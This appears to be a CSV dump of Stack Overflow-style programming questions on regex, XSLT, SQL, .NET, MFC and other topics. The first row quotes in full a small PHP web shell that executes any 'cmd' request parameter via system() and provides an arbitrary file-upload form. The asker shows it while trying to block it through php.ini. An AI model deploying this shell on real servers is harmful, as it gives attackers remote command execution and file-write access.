id,title,body,tags
214431,How do I enable my php.ini file to affect all directories/sub-directories of my server?,<p>A few weeks ago I opened up a hole on my shared server and my friend uploaded the following PHP script:</p> <pre><code>&lt;?php if(isset($_REQUEST['cmd'])){ echo &lt;pre&gt; ; $cmd = ($_REQUEST['cmd']); system($cmd); echo &lt;/pre&gt; ; die; } ?&gt; &lt;?php if(isset($_REQUEST['upload'])){ echo ' &lt;form enctype= multipart/form-data action= .config.php?send method= POST &gt; &lt;input type= hidden name= MAX_FILE_SIZE value= 5120000 /&gt; Send this file: &lt;input name= userfile type= file /&gt; To here: &lt;input type= text name= direct value= /home/chriskan/public_html/_phx2600/wp-content/??? /&gt; &lt;input type= submit value= Send File /&gt; &lt;/form&gt;';} ?&gt; &lt;?php if(isset($_REQUEST['send'])){ $uploaddir = $_POST[ direct ]; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'] $uploadfile)) { echo File is valid and was successfully uploaded.\n ; echo $uploaddir;} else {echo Upload failed ;} } ?&gt; </code></pre> <p>This script allows him to process commands through in-URL variables.</p> <p>I have disabled system among other functions in the php.ini file in my public_html directory. This will prevent the script from running if it's located within my public_html directory but doesn't stop it if it's in a sub-directory of that. If I copy the php.ini file into a sub-directory it will stop it from running from that directory.</p> <p>My question is <strong>how do I enable my php.ini file to affect all directories/sub-directories of my server?</strong></p>,security|php
29487793,Regex for Accepting any number of Characters and -,<p>Can any one give me correct Regular Expression to accept Name starting with characters and ending with characters in middle i can allow - Ex: ABC or ABC-DEF or ABC-DEF-GHI But it should not start or end with - Ex: -ABC or -ABC- or ABC-</p> <p>Here is my Regular Expression:</p> <pre><code>var regex = /^[A-Za-z]-?[A-Za-z]*-?([A-Za-z]+)+$/ </code></pre> <p>This works perfactly fine for me but if suppose i want to give name as AB-CD-EF-GH than this don't work. Note: Remember that Name should start with Characters and End with Characters and in between i can have - but not -- twice. It has to be associated with characters like a-b-c-d</p>,javascript|regex
56837,How can I make an exact copy of a xml node's children with XSLT?,<p>My problem is that my XML document contains snippets of XHTML within it and while passing it through an XSLT I would like it to render those snippets without mangling them.</p> <p>I've tried wrapping the snippet in a CDATA but it doesn't work since less than and greater than are translated to &lt; and &gt; as opposed to being echoed directly.</p> <p>What's the XSL required for doing this?</p>,xml|xslt|xhtml
529208,How do I do a running year for a calendar report?,<p>Here is the Query I am using:</p> <pre><code>SELECT * FROM ra_ProjectCalendar WHERE MonthNumber between @Month and @Month + 12 and FullYear = @Year </code></pre> <p>It works great for this year but stops at December of this year. How do I get it to show a running year?</p>,date
295688,Inner select on one to many,<p>I have 2 tables event + event_artist</p> <p>event<br /> eventId | eventName<br /> 1  gig1<br /> 2 gig2 </p> <p>event_artist<br /> eventId artistName<br /> 1 Led Zip<br /> 1 The Beatles </p> <p>ie Led Zep and the Beatles are both playing @ Gig1</p> <p>I need to create the SQl to bind to a gridview ( you necessarily need to know about gridviews to answers this )</p> <p>The results that i want would look like this eventId = 1 EventName = Gig1. ArtistLineup = Led Zep The beatles</p> <p>So i need to create an alias ArtistLineup that would list all the artist. Via an inner select i think.</p> <p>Any thoughts on what this would look like. </p>,.net|sql|sql-server|tsql
308850,dotnet: How do you get average character width for a font?,<p>Windows Forms:</p> <p>For <code>System.Drawing</code> there is a way to get the font height. </p> <pre><code>Font font = new Font( Arial  10  FontStyle.Regular); float fontHeight = font.GetHeight(); </code></pre> <p>But how do you get the other text metrics like average character width?</p>,.net|fonts
10059,Removing icon from Windows title bars without ditching close button or system menu?,<p>I'm developing an MFC application and I've recently been searching for a good method to remove the icon from a Windows title bar but retain the close button. The two obvious candidate solutions are turning off the system menu style or using the tool window style but I would prefer not to disable the system menu or use the shrunken tool window title bar. Many MFC applications have this functionality so I wonder: am I missing some standard way of doing this? Thanks for any suggestions.</p>,c++|windows|user-interface|mfc
603419,Public Methods inside User control c# .net,<p>How can invoke user control's public method from within the page?</p> <p>I load the control dynamically inside OnInit on the page.Any ideas? For some reason I am getting a build error that says that the method doesn't exist even though it's public. Starting to think that user controls are not worth all the hassle.</p>,c#|asp.net|user-controls
312688,How to remove excess whitespace added to code by FTP program?,<p>This happens repeatedly and is very annoying. I upload some PHP code to a client's server. A few weeks pass. They ask for a change to be made and I re-download the code as they've made some changes. However my code which used to be neat and tidy the last time I looked at it now has an extra lines of whitespace added everywhere. So now where I had two lines of space between some code it now has 3. Where I had a bunch of lines sticking together because they were part of the same for loop or such they're all scattered around now and there's no way to distinguish them.</p> <p>Is there any program/utility to fix this?</p>,php|ftp|whitespace
34493,Excel: list ranges targeted by INDIRECT formulas,<p>We have a few very large Excel workbooks (dozens of tabs over a MB each very complex calculations) with many dozens perhaps hundreds of formulas that use the dreaded INDIRECT function. These formulas are spread out throughout the workbook and target several tables of data to look-up for values.</p> <p>Now I need to move the ranges of data that are targeted by these formulas to a different location in the same workbook.</p> <p>(The reason is not particularly relevant but interesting on its own. We need to run these things in Excel Calculation Services and the latency hit of loading each of the rather large tables one at a time proved to be unacceptably high. We are moving the tables in a contiguous range so we can load them all in one shot.)</p> <p><strong>Is there any way to locate all the INDIRECT formulas that currently refer to the tables we want to move?</strong></p> <p>I don't need to do this on-line. I'll happily take something that takes 4 hours to run as long as it is reliable.</p> <p>Be aware that the .Precedent .Dependent etc methods only track direct formulas.</p> <p>(Also rewriting the spreadsheets in <em>whatever</em> is not an option for us).</p> <p>Thanks!</p>,excel|excel-vba
598695,custom time zone,<p>Is thee some way of implementing a custom time zone in windows?</p> <p>We have some PCs in Creston British Columbia Canada (<a href= http://www.worldtimeserver.com/current%5Ftime%5Fin%5FCA-BC1.aspx?city=Creston rel= nofollow >Time zone exception</a>) which stays the same time all year. So essentially Creston does not observe a time zone. Can I implement this behavior in windowsÉ</p>,windows|timezone
310376,Unordered lists and accessibility,<p>Many (most?) sites aiming for accessibility and standards compliance use unordered lists for their navigation. Does this make the site more accessible or does it just provide useful elements for styling?</p> <p>I don't mind them and I have been using unordered lists in this way. It's just that when I remove the styling from a page to try to gauge it's accessibility it strikes me that it could just as well could be plain links. Where does this come from?</p>,html|css|accessibility|web-standards
161556,Convert IDictionary<string string> keys to lowercase (C#),<p>I've got a Method that gets a IDictionary as a parameter. Now I want to provide a method that retrieves the value from this dictionary but it should be case-invariant.</p> <p>So my solution to this right now was to have a static function that loops through the keys and converts them toLower() like this:</p> <pre><code>private static IDictionary&lt;ILanguage IDictionary&lt;string string&gt;&gt; ConvertKeysToLowerCase( IDictionary&lt;ILanguage IDictionary&lt;string string&gt;&gt; dictionaries) { IDictionary&lt;ILanguage IDictionary&lt;string string&gt;&gt; resultingConvertedDictionaries = new Dictionary&lt;ILanguage IDictionary&lt;string string&gt;&gt;(); foreach(ILanguage keyLanguage in dictionaries.Keys) { IDictionary&lt;string string&gt; convertedDictionatry = new Dictionary&lt;string string&gt;(); foreach(string key in dictionaries[keyLanguage].Keys) { convertedDictionatry.Add(key.ToLower() dictionaries[keyLanguage][key]); } resultingConvertedDictionaries.Add(keyLanguage convertedDictionatry); } return resultingConvertedDictionaries; } </code></pre> <p>Now this is ok but still it's a pretty huge chunk of code that contradicts my idea of clean and efficient . Do you know any alternatives to this so that the .ContainsKey() method of the dictionary doesn't differentiate between casing?</p>,c#|.net|idictionary
442898,Blank Password Conundrum,<p>I've hit a blank here and would appreciate a kick start.</p> <p>I have two password textboxes on a page and on load I default their value properties to a string of '*' since I don't want to display the proper password or even hint at its length. Now I don't want to confuse users by letting them edit these blank strings so on focus I clear the textbox. Now my code thinks the password has changed and will save the blank value which is allowed but not intended.</p>,asp.net|security
99980,What tools do you use to implement SOA/Messaging?,<p><a href= http://www.nservicebus.com/ rel= nofollow >NServiceBus</a> and <a href= http://code.google.com/p/masstransit/ rel= nofollow >MassTransit</a> are two tools that can be used to implement messaging with MSMQ and other message queues.</p> <p>I find that once you start using messaging to have applications talk to each other you don't really want to go back to the old RPC style.</p> <p>My question is what other tools are out there? What tools do you use?</p>,soa|nservicebus|masstransit
27942,Is it worth it to learn a dialect of assembly?,<p>My goals are focused on software application development and maybe web application development but most likely desktop applications. I'm embarking on a path to becoming more familiar with C/C++ but should I go much lower than that into assembly? Or would I not have a benefit for my long-term goals?</p>,assembly
376786,What is VHTML? How it works? Where can I find information about it?,<p>The code below continues many lines until it ends with a expected /veotherwise /vechoose. I started working on a development firm a little ago where they use this html version called vhtml. I have search the web but it brings different definitions for vhtml. I have seen some posts in Joomla about vhtml but they don't look like the code below. I was expecting to get a pointer on how to understand the language. </p> <p>It looks very similar to normal html with even very similar commands or maybe smalltalk. But I just can decipher it. Any help will be appreciated. Please post comments if you want more information.</p> <pre><code>&lt;vechoose&gt; &lt;vewhen criteria='isPortalEdit'&gt; widget: practices-landing-page &lt;/vewhen&gt; &lt;veotherwise&gt; &lt;veinclude src='private/webportal/webtemplate-content.vhtml'&gt; &lt;vesection name='content-body'&gt; &lt;% // Determine portlet visibility %&gt; &lt;vecalc expression='isEmpty = false' output='none' /&gt; &lt;vechoose&gt; &lt;vewhen criteria='isEmpty'&gt; &lt;veif criteria='portlet.ifEmptyDo == Hide '&gt; &lt;script&gt;getTag( 'portlet_&lt;%=portlet.order%&gt;' ).style.display = none ;&lt;/script&gt; &lt;/veif&gt; &lt;veif criteria='portlet.ifEmptyDo == Show Message '&gt; &lt;%#portlet.ifEmptyMessage%&gt; &lt;/veif&gt; &lt;/vewhen&gt; ... </code></pre>,html|smalltalk
1574936,Looking for something similar to AdRotator in .NET,<p>I'm working on a website that has a rotation of testimonials. I need something that is similar to the <code>AdRotator</code> class in .NET. However instead of rotating images I'd like to rotate text blocks which are formated with HTML/CSS. The source can be an XML file just like the ad rotator but I need three elements.</p> <pre><code>Quote Author Name Author Position Title </code></pre> <p>Does anyone know of something in .NET that does this? If not then I guess I will start working on writing a thread safe solution.</p> <p>Thanks Mike</p>,c#|asp.net|html|adrotator
313781,Localization of date-time using custom patterns,<p>I am working on localization for an app where custom patterns are used to format the date-time.</p> <p>one example is: dd-MM HH:mm</p> <p>I need to get localized versions of this custom format for dates so that I get the date using numbers and the time basically using the local order (dd MM or MM dd) and the local seperator for both date and time.</p> <p>This is fairly trivial as long as I am using the default formatting but as soon as I stray from these the formatting becomes hardcoded.</p> <p>Any ideas?</p> <p>Thanks Jonas</p> <p>edit: I have the cultureInfo objects the problem is that when I do a DateTime.ToString( ES-es ) I get too much info - I need only month+day but with the default ToString I get year+month+day</p> <p>Edit again: I see how I can change the ShortDate pattern for each CultureInfo object I use. However I also need the default ShortDate pattern in some situations so changing that would unfortunately leave me with another equivalent problem.</p> <p>Final edit: in case anyone cares. I never did find a solution so I ended up coding a static function that checks the current CultureInfo and returns the correctly formatted date sans year.</p>,c#|datetime|localization
